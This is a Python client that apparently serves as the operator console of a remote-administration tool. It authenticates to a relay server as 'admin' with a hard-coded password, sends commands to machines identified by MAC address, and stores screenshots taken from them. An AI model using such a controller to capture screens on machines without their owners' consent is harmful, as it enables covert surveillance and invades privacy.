import socket
import threading
from datetime import datetime
import json
import os

class Client_A:
    def __init__(self, server = 'localhost', port = 1234, pwd = '0x1e8ad7c'):
        self.server = server
        self.port = port
        self.pwd = pwd

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.connect((self.server, self.port))
        send_data = {
            "role": "admin",
            "pwd": self.pwd
        }

        self.server_socket.send(json.dumps(send_data).encode())
        response = self.server_socket.recv(1024)
        data = json.loads(response.decode())
        if not data["success"]:
            self.server_socket.close()
            raise Exception

    def receive_data(self, send_data):
        self.server_socket.send(json.dumps(send_data).encode())
        while True:
            response = self.server_socket.recv(1500)
            try:
                mac_addr = response[:17].decode()
                st_pos = int(response[17:27].decode())
                ed_pos = int(response[27:37].decode())
                data = response[37:]

                if send_data['command'] == 'screenshot':
                    directory = mac_addr.replace(":","-")
                    os.makedirs(directory, exist_ok=True)
                    file_path = os.path.join(directory, f"screenshot {datetime.now().strftime('%Y-%m-%d %H-%M-%S')}.jpg")
                    with open(file_path, 'ab') as f:
                        f.write(data)
            except:
                pass

            confirm_data = {
                "mac": mac_addr,
                "command": 'received',
                "param1": '',
                "param2": ''
            }
            self.server_socket.send(json.dumps(confirm_data).encode())

            if st_pos == ed_pos:
                break

    def send(self, send_data):
        self.server_socket.send(json.dumps(send_data).encode())
        receive_thread = threading.Thread(target=self.receive_data, args=(send_data,))
        receive_thread.start()
        receive_thread.join()


client_a = Client_A()
while True:
    try:
        mac_addr = input("Enter mac: ")
        command = input("Enter command: ")
        param1 = ''
        param2 = ''
        send_data = {
            "mac": mac_addr,
            "command": command,
            "param1": param1,
            "param2": param2
        }
        client_a.send(send_data) # this function sends data and receive data, wait until finished task
    except:
        pass